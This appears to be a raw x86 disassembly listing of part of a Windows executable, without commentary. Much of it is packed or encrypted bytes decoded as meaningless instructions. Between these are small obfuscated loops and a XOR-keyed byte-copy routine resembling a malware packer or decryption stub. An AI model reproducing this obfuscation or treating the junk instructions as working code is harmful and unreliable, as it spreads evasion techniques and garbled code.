  4029e0:	lods   eax,DWORD PTR ds:[esi]
  4029e1:	dec    ebx
  4029e2:	and    ebp,ebp
  4029e4:	inc    ebp
  4029e5:	adc    al,0xe0
  4029e7:	and    BYTE PTR [ecx+0x13],bl
  4029ea:	mov    cl,0xd1
  4029ec:	and    al,0x1f
  4029ee:	adc    eax,DWORD PTR [esi-0x1c8e0100]
  4029f4:	stos   BYTE PTR es:[edi],al
  4029f5:	pop    esp
  4029f6:	cli    
  4029f7:	push   esi
  4029f8:	xchg   esp,eax
  4029f9:	xchg   ebp,eax
  4029fa:	cld    
  4029fb:	or     DWORD PTR [edi+0x1bddc913],0x22
  402a02:	jnp    0x402a1f
  402a04:	sub    eax,0xe4b8a1bb
  402a09:	mov    al,0x44
  402a0b:	test   eax,0x42314f48
  402a10:	popf   
  402a11:	xchg   BYTE PTR [edx+0x24],dh
  402a14:	mov    esi,0x2ea68ec2
  402a19:	pusha  
  402a1a:	(bad)  
  402a1b:	mov    ds:0x56ba1342,al
  402a20:	ins    BYTE PTR es:[edi],dx
  402a21:	call   0x3f7b:0x6a2fb493
  402a28:	cld    
  402a29:	xchg   ebx,eax
  402a2a:	iret   
  402a2b:	in     al,0x86
  402a2d:	jae    0x4029f1
  402a2f:	add    al,0xc8
  402a31:	jnp    0x402a86
  402a33:	lods   eax,DWORD PTR ds:[esi]
  402a34:	cli    
  402a35:	fidivr DWORD PTR [edx+esi*1]
  402a38:	jb     0x402a42
  402a3a:	(bad)  
  402a3b:	mov    eax,0xeef1e77b
  402a40:	or     DWORD PTR [esi+0x97baed0],ecx
  402a46:	push   edx
  402a47:	sub    eax,esp
  402a49:	inc    edi
  402a4a:	sti    
  402a4b:	or     BYTE PTR [ecx+0x215a5dd1],bl
  402a51:	or     eax,0x752a250c
  402a56:	(bad)  
  402a57:	out    0xcb,al
  402a59:	(bad)  
  402a5b:	mov    esp,eax
  402a5d:	mov    edi,DWORD PTR [edx-0x46d69797]
  402a63:	jbe    0x402a31
  402a65:	out    dx,eax
  402a66:	in     eax,dx
  402a67:	and    ebp,esp
  402a69:	hlt    
  402a6a:	jmp    0x434a:0x4c63b31
  402a71:	add    ebx,DWORD PTR [edx+ebx*1]
  402a74:	jmp    0x402b47
  402a79:	in     al,dx
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	ret    0x3ec9
  402a88:	aam    0xc
  402a8a:	(bad)  
  402a8c:	jl     0x402a30
  402a8e:	jl     0x402b0c
  402a90:	jl     0x402a1d
  402a92:	adc    edi,DWORD PTR [edi+0x4a]
  402a95:	pusha  
  402a96:	mov    edx,ds
  402a98:	push   es
  402a99:	mov    edx,0x9b931b90
  402a9e:	sub    ebp,DWORD PTR [ebx+eiz*2-0x62]
  402aa2:	hlt    
  402aa3:	std    
  402aa4:	cmp    ah,cl
  402aa6:	fisub  WORD PTR [edx-0x66aaaec4]
  402aac:	and    eax,DWORD PTR [ecx-0x52]
  402aaf:	jle    0x402aaf
  402ab1:	popf   
  402ab2:	imul   eax,ecx,0x9d1ffdf6
  402ab8:	push   0x7867d779
  402abd:	out    0xe4,al
  402abf:	xchg   ebp,eax
  402ac0:	arpl   WORD PTR [ecx+0x45a373d0],cx
  402ac6:	idiv   DWORD PTR [edx+0x2a304b99]
  402acc:	mov    ebx,0xbfd34cc5
  402ad1:	clc    
  402ad2:	or     WORD PTR [ecx+edi*4],cx
  402ad6:	scas   al,BYTE PTR es:[edi]
  402ad7:	mov    esi,0xdbfe83ac
  402adc:	xchg   BYTE PTR [ecx],cl
  402ade:	imul   ax,WORD PTR [edi],0x4535
  402ae3:	ret    
  402ae4:	pushf  
  402ae5:	loop   0x402acf
  402ae7:	mov    edi,0xfff6b02c
  402aec:	mov    bh,0x6d
  402aee:	ss mov edx,fs
  402af1:	leave  
  402af2:	into   
  402af3:	sub    ch,ch
  402af5:	cli    
  402af6:	jecxz  0x402b03
  402af8:	add    DWORD PTR [esi-0x404173e2],edx
  402afe:	add    al,0x43
  402b00:	shr    DWORD PTR [ecx+eiz*1],cl
  402b03:	push   edi
  402b04:	or     dh,cl
  402b06:	cmp    eax,0x1727846f
  402b0b:	xor    eax,0x2efda926
  402b10:	adc    cl,al
  402b12:	sbb    esp,DWORD PTR [ebx]
  402b14:	retf   
  402b15:	add    cl,0xe3
  402b18:	out    0x28,al
  402b1a:	sar    DWORD PTR [edi+0x37],1
  402b1d:	ja     0x402ac1
  402b1f:	loope  0x402ab3
  402b21:	bswap  eax
  402b23:	and    cl,BYTE PTR [esi+0x4c0dc250]
  402b29:	or     bl,BYTE PTR [edx+ebx*8-0x5c64cfc6]
  402b30:	mov    eax,0x7b1b219a
  402b35:	lods   al,BYTE PTR ds:[esi]
  402b36:	cwde   
  402b37:	xchg   ebp,eax
  402b38:	cmc    
  402b39:	or     ecx,DWORD PTR [ebx-0x1c]
  402b3c:	adc    BYTE PTR [eax+eax*2+0x6787c2d5],al
  402b43:	test   DWORD PTR [edi+eax*1+0x6c],ecx
  402b47:	dec    ebx
  402b48:	xor    edx,edx
  402b4a:	add    DWORD PTR [ebp-0xc],ebx
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	(bad)  
  402b5f:	inc    edi
  402b60:	add    al,0x67
  402b62:	mov    dl,0xf
  402b64:	jl     0x402be2
  402b66:	mov    ds:0xdc7c7c7c,al
  402b6b:	int3   
  402b6c:	(bad)
  402b6f:	sub    eax,0x47dfa0bb
  402b74:	pop    ebp
  402b75:	inc    DWORD PTR [edx-0xe2aec32]
  402b7b:	pop    ds
  402b7c:	xchg   esi,eax
  402b7d:	call   0x8be352c3
  402b82:	or     DWORD PTR [ebx+0x4e730f96],ebx
  402b88:	mov    bh,0x89
  402b8a:	pop    ebx
  402b8b:	test   edx,0x3339b431
  402b91:	cmp    eax,DWORD PTR [ebx+0x5b103885]
  402b97:	jns    0x402b84
  402b99:	(bad)  
  402b9a:	pop    ss
  402b9b:	pop    esp
  402b9c:	mov    WORD PTR [esi+eax*2+0x50],cs
  402ba0:	mov    al,cl
  402ba2:	jb     0x402b94
  402ba4:	mov    DWORD PTR [esi+0x4d],edi
  402ba7:	in     eax,0xb1
  402ba9:	rcl    BYTE PTR [eax],0x4e
  402bac:	mov    bh,BYTE PTR ds:0x2f9e16f6
  402bb2:	lea    edi,[eax-0x6dd14b83]
  402bb8:	jmp    0xa7e23b38
  402bbd:	sub    dh,dl
  402bbf:	lods   eax,DWORD PTR ds:[esi]
  402bc0:	add    al,bh
  402bc2:	(bad)  
  402bc3:	dec    esi
  402bc4:	loope  0x402bd6
  402bc6:	xchg   esi,eax
  402bc7:	and    al,0xef
  402bc9:	push   edi
  402bca:	jne    0x402c46
  402bcc:	(bad)  
  402bcd:	fmul   QWORD PTR [eax]
  402bcf:	mulps  xmm2,XMMWORD PTR [ebx-0x43]
  402bd3:	and    esi,edi
  402bd5:	inc    esi
  402bd6:	sub    dh,al
  402bd8:	add    ebx,esp
  402bda:	xor    eax,0xb8423bae
  402bdf:	aad    0x66
  402be1:	fst    QWORD PTR [edx+0x7e9cf78c]
  402be7:	jp     0x402c3a
  402be9:	jge    0x402c27
  402beb:	push   ecx
  402bec:	cs xor eax,0x3bee5e08
  402bf2:	or     esi,DWORD PTR [ebp+0x32]
  402bf5:	inc    esi
  402bf6:	leave  
  402bf7:	fwait
  402bf8:	out    0xed,al
  402bfa:	and    dh,ah
  402bfc:	cwde   
  402bfd:	cmc    
  402bfe:	cwde   
  402bff:	mov    bl,0x7f
  402c01:	xchg   edx,eax
  402c02:	(bad)  [esi+0x781c9ac8]
  402c08:	sbb    al,dh
  402c0a:	inc    DWORD PTR [edx]
  402c0c:	sbb    eax,0xead2819a
  402c11:	nop
  402c12:	mov    bl,0x7e
  402c14:	daa    
  402c15:	loop   0x402bfc
  402c17:	ds inc eax
  402c19:	or     cl,cl
  402c1b:	xor    DWORD PTR [edx+edx*4],ebp
  402c1e:	loop   0x402bdb
  402c20:	pop    ebx
  402c21:	mov    eax,DWORD PTR [ebp-0xc]
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x4248da,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x4248da
  402c50:	inc    eax
  402c51:	mov    ds:0x4248da,eax
  402c56:	cmp    DWORD PTR ds:0x4248da,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x4248da,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x44b6e8
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x4430d0
  402c83:	cmp    DWORD PTR ds:0x4248da,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x4248da
  402c98:	inc    eax
  402c99:	mov    ds:0x4248da,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x4489a4,0x0
  402cad:	mov    edx,DWORD PTR ds:0x4489a4
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x4489a4,edx
  402cba:	cmp    DWORD PTR ds:0x4489a4,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x4248d6
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x443000
  402cda:	cmp    DWORD PTR ds:0x4489a4,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x4489a4
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x4489a4,edx
  402cf4:	cmp    DWORD PTR ds:0x4489a4,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x4248ce,0x10
  402d11:	cmp    DWORD PTR ds:0x4248ce,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x4248ce,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x44b6d0
  402d30:	push   0x44b6d0
  402d35:	push   0x8e35
  402d3a:	push   0x4109ab
  402d3f:	push   0x410971
  402d44:	push   0x410927
  402d49:	call   DWORD PTR ds:0x443348
  402d4f:	mov    edx,DWORD PTR ds:0x4248ce
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x4248ce,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0xcee45e2b
  402db9:	xor    BYTE PTR [edx],bh
  402dbb:	dec    esp
  402dbc:	clc    
  402dbd:	push   cs
  402dbe:	jl     0x402e3c
  402dc0:	into   
  402dc1:	jg     0x402e3f
  402dc3:	jl     0x402d79
  402dc5:	je     0x402d96
  402dc7:	dec    esp
  402dc8:	pop    ds
  402dc9:	dec    ecx
  402dca:	mov    ds:0xd507ad1c,al
  402dcf:	xor    al,0x61
  402dd1:	and    al,0x0
  402dd3:	imul   esi,ebx,0x88e8791c
  402dd9:	or     ecx,DWORD PTR [edi]
  402ddb:	fucomip st,st(1)
  402ddd:	add    eax,0xee1b4af6
  402de2:	es and al,0x73
  402de5:	stos   DWORD PTR es:[edi],eax
  402de6:	mov    eax,0x260eec5b
  402deb:	leave  
  402dec:	or     eax,DWORD PTR [edx-0x6d]
  402def:	mov    dl,0xc0
  402df1:	xlat   BYTE PTR ds:[ebx]
  402df2:	into   
  402df3:	pop    esp
  402df4:	or     dh,BYTE PTR [ebp*1-0x2ae78a29]
  402dfb:	xchg   ebp,eax
  402dfc:	in     eax,0x9b
  402dfe:	sub    al,0xb9
  402e00:	mov    eax,0x7b3b08b0
  402e05:	cmc    
  402e06:	outs   dx,DWORD PTR ds:[esi]
  402e07:	inc    esp
  402e08:	test   al,0x18
  402e0a:	fwait
  402e0b:	scas   eax,DWORD PTR es:[edi]
  402e0c:	pop    esp
  402e0d:	sbb    BYTE PTR [ebx+0x34],dh
  402e10:	pop    esp
  402e11:	jmp    0x36f8:0x9404ce27
  402e18:	scas   eax,DWORD PTR es:[edi]
  402e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e1a:	mov    ebp,0xb3976d65
  402e1f:	add    DWORD PTR [ebx+ebp*1-0x4f8e8639],edx
  402e26:	test   eax,0x6550e17e
  402e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e2c:	bound  eax,QWORD PTR [ebx-0x73]
  402e2f:	pop    edi
  402e30:	icebp  
  402e31:	xor    al,0xd9
  402e33:	mov    eax,0x367d3070
  402e38:	cmp    ebp,DWORD PTR [edx+0x6f486ffb]
  402e3e:	add    eax,0x8e7bce6
  402e43:	ins    BYTE PTR es:[edi],dx
  402e44:	push   cs
  402e45:	push   ebx
  402e46:	mov    ch,BYTE PTR [eax]
  402e48:	dec    ebp
  402e49:	adc    eax,0x51026dc2
  402e4e:	into   
  402e4f:	mov    edi,0xc94c2820
  402e54:	cmc    
  402e55:	test   eax,0x5d7d08da
  402e5a:	xor    esi,DWORD PTR [edi+0x50]
  402e5d:	adc    cl,BYTE PTR [edx]
  402e5f:	inc    ecx
  402e60:	pusha  
  402e61:	pop    ss
  402e62:	ret    0x7e11
  402e65:	jnp    0x402dfd
  402e67:	call   0xb851d799
  402e6c:	div    ecx
  402e6e:	mov    esi,0xf139d114
  402e73:	add    bl,BYTE PTR [eax-0x663d9363]
  402e79:	xor    eax,DWORD PTR [ecx-0x51d9a818]
  402e7f:	jbe    0x402e8a
  402e81:	hlt    
  402e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e83:	push   edx
  402e84:	stos   DWORD PTR es:[edi],eax
  402e85:	scas   eax,DWORD PTR es:[edi]
  402e86:	push   edi
  402e87:	ins    DWORD PTR es:[edi],dx
  402e88:	cmp    eax,0x83b8303b
  402e8d:	pop    ss
  402e8e:	push   ss
  402e8f:	rcr    DWORD PTR [edx+0x5f],cl
  402e92:	mov    esp,0xcd6c45f6
  402e97:	lahf   
  402e98:	or     cl,0xee
  402e9b:	xchg   edx,eax
  402e9c:	loop   0x402ec9
  402e9e:	cmp    bl,0xab
  402ea1:	test   eax,0xc61a81ac
  402ea6:	mov    bl,0xcb
  402ea8:	jb     0x402edf
  402eaa:	aad    0xf8
  402eac:	xor    BYTE PTR [esi],0x9d
  402eaf:	arpl   WORD PTR [eax],dx
  402eb1:	jbe    0x402e8d
  402eb3:	iret   
  402eb4:	lods   al,BYTE PTR ds:[esi]
  402eb5:	loop   0x402f10
  402eb7:	fs xor bl,bh
  402eba:	xchg   esi,eax
  402ebb:	adc    DWORD PTR [ecx-0xe],0xfaeb4e96
  402ec2:	pop    eax
  402ec3:	and    DWORD PTR [edi+0x48f9f50e],0xffffff8f
  402eca:	push   0x5b8ed47f
  402ecf:	fwait
  402ed0:	and    ah,BYTE PTR [ecx-0x6c0cb1ce]
  402ed6:	test   BYTE PTR [edx-0x16],dh
  402ed9:	repnz dec esi
  402edb:	dec    esi
  402edc:	or     BYTE PTR [eax-0x73],bh
  402edf:	inc    ebp
  402ee0:	repz ret 0xdce0
  402ee4:	pop    esi
  402ee5:	jnp    0x402ea1
  402ee7:	push   ecx
  402ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee9:	ds stc 
  402eeb:	call   0x1d45a977
  402ef0:	(bad)  
  402ef1:	and    DWORD PTR [edi+0x2f],ebp
  402ef4:	mov    eax,ds:0xda66c562
  402ef9:	mov    bh,0x65
  402efb:	adc    eax,0xa525fb0d
  402f00:	xor    esi,DWORD PTR [ebp-0x1a566232]
  402f06:	imul   ecx,DWORD PTR [edi],0x673f6b59
  402f0c:	pop    edx
  402f0d:	adc    ah,BYTE PTR [esi-0x2f]
  402f10:	nop
  402f11:	adc    DWORD PTR [eax+0x536ca76a],edx
  402f17:	jmp    0x402f21
  402f1c:	mov    esi,0x32729e
  402f21:	mov    eax,DWORD PTR [ebp-0x8]
  402f24:	mov    edi,DWORD PTR [ebp-0x4]
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	ret    
  402f6f:	add    dh,ch
  402f71:	je     0x402fbd
  402f73:	add    DWORD PTR [esp+edi*2-0x32],edi
  402f77:	jg     0x402ff5
  402f79:	jl     0x402f04
  402f7b:	shr    BYTE PTR [esi+0x5],1
  402f7e:	lds    ebx,FWORD PTR [edi+0x2f]
  402f81:	test   eax,0xa7e0e036
  402f86:	or     BYTE PTR [eax+0x6e],dl
  402f89:	adc    ch,BYTE PTR [edi]
  402f8b:	stos   BYTE PTR es:[edi],al
  402f8c:	stos   BYTE PTR es:[edi],al
  402f8d:	ja     0x402fff
  402f8f:	(bad)  
  402f90:	sbb    al,0x22
  402f92:	iret   
  402f93:	cmp    al,bl
  402f95:	lahf   
  402f96:	sar    BYTE PTR [ebx+0x4a087bae],1
  402f9c:	imul   ecx,esp,0x6416f930
  402fa2:	sti    
  402fa3:	popf   
  402fa4:	dec    ebp
  402fa5:	sbb    BYTE PTR [ecx-0x3d],bl
  402fa8:	mov    ?,WORD PTR [esi]
  402faa:	or     BYTE PTR [esi+0x6651eeb3],0xd9
  402fb1:	retf   0xb25b
  402fb4:	loop   0x402faf
  402fb6:	xchg   esp,eax
  402fb7:	push   es
  402fb8:	pop    es
  402fb9:	in     al,0x5b
  402fbb:	adc    ecx,ebp
  402fbd:	loopne 0x403008
  402fbf:	mov    edx,0xe73f007b
  402fc4:	push   cs
  402fc5:	out    dx,al
  402fc6:	fidivr WORD PTR [ecx]
  402fc8:	push   esi
  402fc9:	imul   edi
  402fcb:	or     cl,BYTE PTR [ebx+0x29]
  402fce:	sub    DWORD PTR [ebx-0x58bb7384],edx
  402fd4:	dec    ebx
  402fd5:	lahf   
  402fd6:	fcmovbe st,st(4)
  402fd8:	sbb    DWORD PTR ds:0x442dd245,0x6a1206ec
  402fe2:	and    BYTE PTR [ecx+ecx*2-0x52],ch
  402fe6:	test   eax,0x8affd66b
  402feb:	out    dx,al
  402fec:	dec    esp
  402fed:	xchg   edx,eax
  402fee:	push   esp
  402fef:	or     eax,0xc95e1034
  402ff4:	fwait
  402ff5:	add    esp,ebp
  402ff7:	pop    esi
  402ff8:	xchg   esi,eax
  402ff9:	sbb    cl,BYTE PTR [ecx+0x22]
  402ffc:	jg     0x403076
  402ffe:	and    eax,0x4488d0dd
  403003:	pop    eax
  403004:	test   eax,0x2bffa4f
  403009:	out    dx,al
  40300a:	xchg   ebp,eax
  40300b:	jmp    0xec258d64
  403010:	(bad)  
  403011:	in     eax,0x7c
  403013:	fwait
  403014:	mov    ebp,0xff3bbe83
  403019:	fnstsw WORD PTR [edx]
  40301b:	mov    ds:0x8ca339a8,al
  403020:	mov    ecx,0xa85c1ed7
  403025:	pop    edx
  403026:	test   esp,edx
  403028:	pop    esi
  403029:	push   es
  40302a:	sbb    BYTE PTR ds:0x53ef46f2,dh
  403030:	iret   
  403031:	int3   
  403032:	into   
  403033:	adc    eax,0x97cec58
  403038:	mov    ebp,0x93508d47
  40303d:	xchg   ecx,eax
  40303e:	(bad)  
  40303f:	mov    edi,0xfda06204
  403044:	adc    ch,BYTE PTR [edx-0xb]
  403047:	in     eax,dx
  403048:	jnp    0x403026
  40304a:	ds das 
  40304c:	push   es
  40304d:	shld   esi,esi,cl
  403050:	dec    ebp
  403051:	out    0x90,al
  403053:	inc    edi
  403054:	sbb    cl,BYTE PTR [edi]
  403056:	and    eax,0x683cbbfc
  40305b:	mov    edx,0x14c3f7c5
  403060:	add    ecx,0xcb08b2f6
  403066:	sbb    ecx,DWORD PTR [ebp+0x66d8555e]
  40306c:	daa    
  40306d:	push   edx
  40306e:	fs mov ch,0xc2
  403071:	dec    edx
  403072:	sub    eax,0x5fbbed54
  403077:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  403079:	jbe    0x403046
  40307b:	push   ecx
  40307c:	sub    BYTE PTR [ebx-0xa],ch
  40307f:	mov    fs,WORD PTR [ebp-0x3a]
  403082:	mov    ebp,0xbfbf4af3
  403087:	inc    edx
  403088:	mov    al,0x36
  40308a:	aad    0xe6
  40308c:	mov    edi,0x492081e4
  403091:	sti    
  403092:	xchg   esi,eax
  403093:	test   DWORD PTR [edi],0x6ceffaee
  403099:	nop
  40309a:	jge    0x403109
  40309c:	cmc    
  40309d:	inc    eax
  40309e:	mov    eax,0xd7b9b170
  4030a3:	and    eax,DWORD PTR [edi-0x78a99fef]
  4030a9:	sbb    bl,bl
  4030ab:	mov    al,ds:0x9c7f2aed
  4030b0:	fbld   TBYTE PTR [ecx+0x36]
  4030b3:	push   esi
  4030b4:	mov    esi,0xec864077
  4030b9:	jge    0x4030ca
  4030bb:	scas   eax,DWORD PTR es:[edi]
  4030bc:	mov    ebp,0x33dfb5a5
  4030c1:	mov    esi,0xedcf3ef7
  4030c6:	mov    ah,0x77
  4030c8:	jbe    0x403090
  4030ca:	inc    esi
  4030cb:	xchg   edi,eax
  4030cc:	cmp    edx,esi
  4030ce:	jbe    0x402f1c
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0xa6299de8
  4030ec:	rcl    DWORD PTR [edx-0xc],cl
  4030ef:	sbb    al,0x3
  4030f1:	jl     0x40316f
  4030f3:	into   
  4030f4:	jg     0x403172
  4030f6:	jl     0x4030dd
  4030f8:	icebp  
  4030f9:	xchg   edi,eax
  4030fa:	imul   ebx,DWORD PTR [edx+0xaf558a1],0xafabb66
  403104:	push   eax
  403105:	mov    WORD PTR [eax-0x64],ss
  403108:	daa    
  403109:	nop
  40310a:	sbb    ebx,DWORD PTR [ebx+ecx*8-0x1c]
  40310e:	mov    al,ds:0x3fd6013a
  403113:	aam    0x4b
  403115:	mov    eax,0x358dbd22
  40311a:	and    bh,BYTE PTR [bx+0x69]
  40311e:	outs   dx,BYTE PTR ds:[esi]
  40311f:	leave  
  403120:	cdq    
  403121:	cmp    ch,bl
  403123:	std    
  403124:	push   esp
  403125:	xchg   esp,edx
  403127:	dec    ebx
  403128:	and    ebx,eax
  40312a:	iret   
  40312b:	cli    
  40312c:	test   DWORD PTR ss:[edx-0x2be65012],ebp
  403133:	inc    esi
  403134:	hlt    
  403135:	fwait
  403136:	ret    0x6a5d
  403139:	std    
  40313a:	pop    ss
  40313b:	or     al,0x32
  40313d:	adc    BYTE PTR [esi-0x2],0x18
  403141:	mov    cl,0xf6
  403143:	loop   0x403181
  403145:	add    DWORD PTR [edi-0x57],0xaac1c1a6
  40314c:	lods   eax,DWORD PTR ds:[esi]
  40314d:	test   DWORD PTR [ecx],edi
  40314f:	adc    ch,al
  403151:	pop    edx
  403152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403153:	loop   0x403171
  403155:	inc    ecx
  403156:	lahf   
  403157:	mov    ds:0x3045d68f,al
  40315c:	aad    0xc7
  40315e:	out    dx,al
  40315f:	sub    al,0xf0
  403161:	jl     0x403121
  403163:	ss mov dl,0x7a
  403166:	cs dec ecx
  403168:	mov    eax,0x76cb7f9f
  40316d:	push   edx
  40316e:	xchg   edi,eax
  40316f:	add    ebx,edi
  403171:	jge    0x403185
  403173:	sub    DWORD PTR [ebp+esi*1-0x216132f7],ecx
  40317a:	jecxz  0x403118
  40317c:	xchg   dh,bl
  40317e:	jmp    0xdf76:0x8b7ee453
  403185:	and    ecx,edi
  403187:	dec    esp
  403188:	repz push eax
  40318a:	pop    edi
  40318b:	aad    0xe9
  40318d:	daa    
  40318e:	fsubr  st,st(4)
  403190:	mov    ch,0x25
  403192:	or     ebx,ecx
  403194:	push   ebp
  403195:	dec    esi
  403196:	icebp  
  403197:	cmp    BYTE PTR [edi+0x4b],ah
  40319a:	les    ebp,FWORD PTR [ecx-0x3d]
  40319d:	stos   BYTE PTR es:[edi],al
  40319e:	xchg   esi,eax
  40319f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a0:	mov    cl,BYTE PTR [eax-0x18]
  4031a3:	cmc    
  4031a4:	dec    ebp
  4031a5:	out    dx,al
  4031a6:	cli    
  4031a7:	popa   
  4031a8:	jecxz  0x40317e
  4031aa:	dec    eax
  4031ab:	push   0xffffffb4
  4031ad:	xchg   esp,eax
  4031ae:	or     BYTE PTR [eax+0x52],al
  4031b1:	mov    ds:0x45b1e725,eax
  4031b6:	adc    al,0x55
  4031b8:	popa   
  4031b9:	mov    esi,0xbf0d616c
  4031be:	dec    ebp
  4031bf:	mov    dh,0x5c
  4031c1:	mov    BYTE PTR [edx*4-0x4c639a0a],al
  4031c8:	pop    edx
  4031c9:	jmp    0xfb5e:0xf73c5bf5
  4031d0:	jmp    0x24be6019
  4031d5:	xlat   BYTE PTR ds:[ebx]
  4031d6:	out    0xdc,eax
  4031d8:	sti    
  4031d9:	xchg   ecx,eax
  4031da:	scas   al,BYTE PTR es:[edi]
  4031db:	jmp    0x3ec0b576
  4031e0:	mov    al,ds:0xe299c543
  4031e5:	xchg   edi,eax
  4031e6:	lea    eax,[edx+eiz*8-0x3d]
  4031ea:	jcxz   0x403172
  4031ed:	pusha  
  4031ee:	pop    edx
  4031ef:	pop    eax
  4031f0:	rol    BYTE PTR [edi],1
  4031f2:	add    ah,BYTE PTR [edi]
  4031f4:	mov    esi,0xd7e81371
  4031f9:	scas   al,BYTE PTR es:[edi]
  4031fa:	nop
  4031fb:	pop    esp
  4031fc:	imul   ebp,DWORD PTR ds:0xde381553,0xa0ac2c40
  403206:	stc    
  403207:	mov    bl,BYTE PTR ds:0xc8ac9085
  40320d:	xlat   BYTE PTR ds:[ebx]
  40320e:	sub    BYTE PTR [edx+0x2a],bl
  403211:	outs   dx,DWORD PTR ds:[esi]
  403212:	movhps xmm0,QWORD PTR [eax-0x76]
  403216:	icebp  
  403217:	mov    edi,0x1004f6a2
  40321c:	adc    BYTE PTR [esi-0x18],dh
  40321f:	inc    ecx
  403220:	jmp    0x403260
  403222:	dec    BYTE PTR [ebx]
  403224:	jge    0x403262
  403226:	ja     0x4031ad
  403228:	sar    ebp,1
  40322a:	inc    ecx
  40322b:	nop
  40322c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322d:	fimul  WORD PTR [esp+edi*4-0x74e917b6]
  403234:	mov    cl,0x32
  403236:	xchg   esi,eax
  403237:	push   esp
  403238:	jmp    0xbf480e7e
  40323d:	(bad)  
  40323e:	push   esi
  40323f:	mov    bh,0xe8
  403241:	out    0x4b,al
  403243:	push   ss
  403244:	cmp    ah,BYTE PTR [edi+0x61]
  403247:	xor    DWORD PTR [ebp+0x5f],0xcc2c95e
  40324e:	add    BYTE PTR [ebp-0x75],dl
  403251:	in     al,dx
  403252:	mov    eax,ds:0x445224
  403257:	add    DWORD PTR ds:0x448998,edx
  40325d:	mov    edx,0x32729e
  403262:	movzx  ecx,WORD PTR ds:0x4248da
  403269:	or     DWORD PTR ds:0x44e40c,ecx
  40326f:	sub    eax,edx
  403271:	mov    ecx,DWORD PTR ds:0x44e41c
